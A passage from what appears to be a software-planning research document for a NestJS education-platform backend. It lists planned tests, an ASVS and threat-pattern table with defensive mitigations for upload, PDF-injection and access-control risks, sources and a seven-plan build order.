| SCH-07 | School ranking formula matches Phase 3 InstitutionalService | unit | `npm test -- school.service.spec.ts -t "ranking formula"` | ❌ Wave 0 reconciliation test |
| SCH-08 | PQ-9 PDF escapes <script> in institution name | integration | `npm test -- school-pdf.integration.spec.ts` | ❌ NEW |
| SCH-09 | inactive-club alert threshold = 30 days | unit | `npm test -- club.service.spec.ts -t "30 day threshold"` | ❌ extend |
| FAM-01 | detect returns null when opt-IN off | unit | `npm test -- family.service.spec.ts -t "opt-in off"` | ❌ NEW |
| FAM-01 | detect returns candidates when both opt-IN | unit | `npm test -- family.service.spec.ts -t "opt-in match"` | ❌ extend existing |
| FAM-03 | 30-day waiting uses FamilyMembership.joinedAt | unit | `npm test -- family.service.spec.ts -t "30 day waiting"` | ❌ extend |
| FAM-03 | migration backfills FamilyMembership from User.createdAt | integration | `npm test -- family-migration.integration.spec.ts` | ❌ NEW |
| FAM-04 | avg RI computed via replica | unit | `npm test -- family.service.spec.ts -t "replica"` | ❌ NEW |
| FAM-05 | Top-50 anonymizes under-14 surface names | unit | `npm test -- family.service.spec.ts -t "anonymize minor"` | ❌ NEW |
| FAM-06 | concurrent respondToInvite race fails one | unit | `npm test -- family.service.spec.ts -t "TOCTOU"` | ❌ NEW (use jest.fn with transaction mock) |
| FAM-06 | address change requires tuman admin | unit | `npm test -- address-change.service.spec.ts` | ❌ NEW |
| ORG-01 | scope guard rejects cross-institution HR | unit | `npm test -- idora.service.spec.ts -t "scope"` | ❌ extend |
| ORG-02 | reading from OrgRating without rewriting | unit | `npm test -- idora.service.spec.ts -t "readonly"` | ❌ Wave 0 reconciliation |
| ORG-03 | reading hour creation + QR attendance | unit | exists (idora spec, 785 lines) | ✅ extend for MinIO media path |
| ORG-04 | 90-day book corner reminder dispatches alert | unit | `npm test -- idora.service.spec.ts -t "90 day reminder"` | ❌ extend (currently STUB) |
| ORG-05 | MVP mukofot taklifi creates AiAuditLog + email | unit | `npm test -- mukofot.service.spec.ts` | ❌ NEW |
| ORG-06 | PQ-9 PDF escapes XSS | integration | `npm test -- idora-pdf.integration.spec.ts` | ❌ NEW |
| ORG-07 | HR-only role guard on prof-books add | unit | `npm test -- idora.controller.spec.ts -t "HR role"` | ❌ NEW (no controller spec exists today) |
| UNI-01 | approve uses universityId + STUDENT_UNIVERSITY enum | unit | `npm test -- otm.service.spec.ts -t "STUDENT_UNIVERSITY"` | ❌ Wave 0 BUGFIX test |
| UNI-02 | getStudents returns non-empty for seeded OTM | integration | `npm test -- otm.integration.spec.ts` | ❌ NEW smoke test |
| UNI-03 | accreditation PDF escapes XSS | integration | `npm test -- otm-pdf.integration.spec.ts` | ❌ NEW |
| UNI-04 | student progress endpoint aggregates by faculty | unit | `npm test -- otm.service.spec.ts -t "faculty aggregation"` | ❌ extend |

### Sampling Rate

- **Per task commit:** `npm test -- --testPathPattern={modified-module}` (5-15s)
- **Per wave merge:** `cd apps/backend && npm test` (full suite, ~90s currently)
- **Phase gate:** full suite green AND test count ≥1010 before `/gsd-verify-work`

### Wave 0 Gaps

- [ ] `apps/backend/src/common/utils/__tests__/admin-scope.util.spec.ts` — assert `assertInstitutionInScope` rejects sibling institutions + fails CLOSED on null scope
- [ ] `apps/backend/src/modules/otm/__tests__/otm.service.spec.ts` — REWRITE existing mock to use `STUDENT_UNIVERSITY` enum + `universityId` field (these silent-pass tests are the smoking gun for the P1 bug)
- [ ] `apps/backend/src/modules/club/__tests__/club-consent.spec.ts` — NEW for token mint/verify/expire flow
- [ ] `apps/backend/src/modules/club/__tests__/club-media.integration.spec.ts` — NEW for MinIO upload + MIME sniff
- [ ] `apps/backend/src/infra/minio/__tests__/minio.service.spec.ts` — NEW for the MinIO infra wrapper

Wave 0 also adds the `MinioService` infra module + base config + bucket bootstrap.

---

## Security Domain

`security_enforcement` is enabled (not explicitly disabled in `.planning/config.json`). Phase 6 touches authentication-adjacent flows (parent consent), file upload, and PDF generation — all high-risk surfaces.

### Applicable ASVS Categories

| ASVS Category | Applies | Standard Control |
|---------------|---------|------------------|
| V2 Authentication | Yes (parent consent token verification) | bcrypt-hashed nonce + single-use + 48h expiry; Phase 1 JWT for admin paths |
| V3 Session Management | No (consent uses one-shot token, not session) | n/a |
| V4 Access Control | **Yes (critical)** | RolesGuard + service-layer `assertInstitutionInScope` (Plan 04-04-fix-followup pattern) |
| V5 Input Validation | **Yes (critical)** | Class-validator on all DTOs; `escapeHtml` on every PDF interpolation; `file-type` MIME sniff on uploads |
| V6 Cryptography | Yes (token hashing) | bcrypt for consent tokens; never hand-roll |
| V8 Data Protection | Yes (PII in family profile, school PQ-9) | `maskNameIfMinor` for under-14; K-anonymity threshold 5 for small buckets |
| V11 Business Logic | Yes (FAM-06 race, SCH-04 consent forgery) | Interactive `$transaction` with re-checks; constant-time bcrypt compare |
| V12 Files & Resources | **Yes (critical)** | 50MB per-file cap; MIME whitelist; magic-byte verification; per-bucket S3 prefix isolation |

### Known Threat Patterns for NestJS + Prisma + Puppeteer + MinIO stack

| Pattern | STRIDE | Standard Mitigation |
|---------|--------|---------------------|
| HTML injection in Puppeteer PDF (PQ-9 reports) | Tampering / Info disclosure | `escapeHtml` on every interpolation; Plan 04-03 + Plan 05-04 single-source escape util |
| File upload MIME spoofing (debate "photo" is actually `*.exe`) | Tampering | `file-type` magic-byte sniff; whitelist MIME; reject `application/octet-stream` |
| Path traversal in MinIO object key | EoP | Use `cuid()` + institutionId; never use user-supplied filename |
| Race condition on FAM-06 "one user = one family" | Tampering | Interactive `$transaction` with re-check inside; Prisma serializable not required when re-check is explicit |
| TOCTOU on parent consent token replay | Spoofing | `consumedAt` single-use field; bcrypt compare constant-time |
| Cross-institution data leak (sibling MUASSASA_ADMIN) | Info disclosure | `assertInstitutionInScope` fail-CLOSED on null FK; before-cache check |
| Mass-enrollment by malicious teacher | EoP | Rate-limit `/club/{id}/members` to 50/hour per actor; per-club member count cap (e.g., 200 — informed by class sizes) |
| Mukofot self-award by HR admin | Tampering | `isMvp` written by Phase 3 cron, never user-mutable; admin can only execute, not pick |
| Address-change abuse (user changes addr to dominant family region) | Tampering | TUMAN_ADMIN approval gate; FAM-03 30-day waiting from join already mitigates rapid-membership-cycling |
| XSS in family public profile | Tampering | escapeHtml on family name; family name length-limited 100 chars |

---

## Sources

### Primary (HIGH confidence)

- `apps/backend/prisma/schema.prisma` (lines 1-837) — direct read; every model verified
- `apps/backend/src/app.module.ts` (lines 22-29 + 75-77) — Phase 6 modules wired
- `apps/backend/src/modules/school/school.service.ts` (430 lines) — verified
- `apps/backend/src/modules/family/family.service.ts` (377 lines) — verified
- `apps/backend/src/modules/idora/idora.service.ts` (489 lines) — verified including XSS
- `apps/backend/src/modules/otm/otm.service.ts` (352 lines) — verified including UNI-01/02 BUG
- `apps/backend/src/modules/club/club.service.ts` (448 lines) — verified
- `apps/backend/src/modules/top/institutional.service.ts` (lines 1-100) — R-DUP source
- `apps/backend/src/common/utils/admin-scope.util.ts` (121 lines) — scope pattern source
- `apps/backend/src/infra/pdf/pdf.service.ts` (356 lines) — escapeHtml + buildMonthlyReportHtml
- `apps/backend/src/infra/sms/sms.service.ts` (40 lines) — NOTIFICATION_QUEUE pattern
- `apps/backend/src/modules/ai/alert-dispatch.service.ts` — CLUB_INACTIVE dispatcher
- `apps/backend/src/modules/users/users.service.ts:325-331` — universityId field write
- `apps/backend/src/modules/transactions/transactions.service.ts` — `$transaction` interactive pattern
- `.planning/REQUIREMENTS.md` lines 96-133 — Phase 6 requirements
- `.planning/STATE.md` — phase 1-5 carry-over decisions
- `.planning/phases/04-payment-subscriptions/04-VERIFICATION.md` — subscription state machine + PAY-08 audit pattern
- `.planning/phases/05-statistics-alerts-maps-landing-page/05-VERIFICATION.md` — alerts + escapeHtml carry-overs
- `CLAUDE.md` §I.4 / §II.1 / §IV.4 / §V.3 / §VI.4 / §VII / §VIII / §XIII / §XIV.3 — verified requirements

### Secondary (MEDIUM confidence)

- npm registry version-check for `minio`, `file-type`, `sharp` — unverified at research time, deferred to Wave 0 checkpoint
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html) — MIME sniff pattern

### Tertiary (LOW confidence)

- MinIO storage cost estimate ($0.02/GB-month on Unicon.uz) — operator-supplied estimate, not contractually verified

---

## Metadata

**Confidence breakdown:**

- Standard stack: HIGH — every backend dep verified in `package.json`. NEW deps tagged `[ASSUMED]` pending slopcheck.
- Architecture: HIGH — all 5 Phase 6 modules wired into app.module + tests passing for the existing scaffolds.
- Pitfalls: HIGH — direct code reads found UNI-01/02 bug and ORG-06 XSS within a single audit pass.
- Schema additions: MEDIUM — proposed model shapes are derived from existing patterns; field choices (e.g., AddressChangeRequest.fromAddressId nullable) need user input via OQ-2.
- File upload strategy: HIGH — pattern mirrors Phase 2 books-import; MinIO is the standard next step.
- Build order: MEDIUM — depends on whether the orchestrator confirms 7 plans vs 6. Wave 0 + R-DUP fix are non-negotiable.
- Test count target: HIGH — based on direct line-counts of existing specs and gap analysis.

**Research date:** 2026-06-08
**Valid until:** 2026-07-08 (30 days; stable scaffold + verified Phase 3-5 carry-overs)

---

## Plan Count Recommendation

7 plans:

1. **06-01: Wave 0 hardening + schema + MinIO infra**
   - Fix UNI-01/UNI-02 P1 bugs (OTM service field/enum mismatch)
   - Refactor ORG-06 + UNI-03 PDF to use escapeHtml pattern
   - Add scope util `assertInstitutionInScope`
   - Migrations: FamilyMembership, AddressChangeRequest, ClubMemberConsentToken, DebateMedia/ReadingHourMedia/BookCornerVerification
   - Install + verify `minio`, `file-type`, `sharp`
   - New `MinioService` infra module
   - Reconcile R-DUP — delete `SchoolService.computeSchoolRatings` + `IdoraService.computeAndSaveRating` write paths; Phase 3 InstitutionalService is sole writer
2. **06-02: School module (SCH-01..09)**
   - Scope guards
   - Reject endpoint
   - Inactive-club threshold alignment to 30 days
   - Weekly cron (Sunday 02:00) as READ-only cache refresh
   - PQ-9 PDF embeds Jadidlar section + debate thumbnails
3. **06-03: Family module (FAM-01..06)**
   - Opt-IN gate (`User.familyDetectionEnabled`)
   - 30-day from FamilyMembership.joinedAt
   - FAM-06 TOCTOU `$transaction` fix
   - AddressChangeRequest state machine + tuman admin approval flow
   - Top-50 family with maskNameIfMinor
4. **06-04: Club consent + debate media (SCH-04, SCH-05)**
   - Parent SMS token deep-link UX
   - `/club/consent` frontend page (NEW)
   - Debate DRAFT→PUBLISHED state with media-required gate
   - File upload endpoint + MinIO + Sharp thumbnail
5. **06-05: Idora module (ORG-01..07)**
   - Scope guards
   - `bookCornerReminders` cron wires to `AlertDispatchService`
   - Mukofot taklifi audit + HR email
   - PQ-9 PDF refactor (already in Wave 0)
   - Kasb adabiyotlar HR role guard
6. **06-06: OTM module (UNI-01..04)**
   - Verify Wave 0 P1 fixes
   - Faculty grouping in stats + accreditation PDF
   - UNI-04 student progress (aggregated by faculty)
7. **06-07: Closeout — cross-module smoke + Phase 6 VERIFICATION**
   - End-to-end smoke: seed school + family + idora + otm; assert all PQ-9 PDFs render under 5s without escaping bugs
   - Update STATE.md, REQUIREMENTS.md checkboxes
   - Adversarial review (mirrors Phase 4/5 4-fix-workflow culture)

Dependencies: 06-01 blocks all; 06-04 depends on 06-01 (MinIO ready); 06-02..06-06 can run in parallel after 06-01; 06-07 is gate.
